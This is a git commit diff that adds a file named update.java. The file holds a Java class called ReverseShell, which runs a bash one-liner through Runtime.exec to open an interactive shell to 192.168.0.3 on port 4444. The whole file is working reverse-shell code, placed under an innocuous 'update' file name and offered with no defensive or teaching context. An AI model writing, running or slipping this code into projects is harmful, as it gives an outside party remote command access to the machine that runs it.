58f5c585cda4c2ba4868ac2677c2015c5948c0b3
GiN ichimaru <arshed0056@gmail.com>
2025-12-19 04:55:00 -0500

    Add files via upload

---
+++ update.java
@@ -0,0 +1,17 @@
+import java.io.IOException;
+
+public class ReverseShell {
+    public static void main(String[] args) {
+        String host = "192.168.0.3";
+        int port = 4444;
+
+        // This is exactly the bash command you already tested manually
+        String cmd = String.format("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", host, port);
+
+        try {
+            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
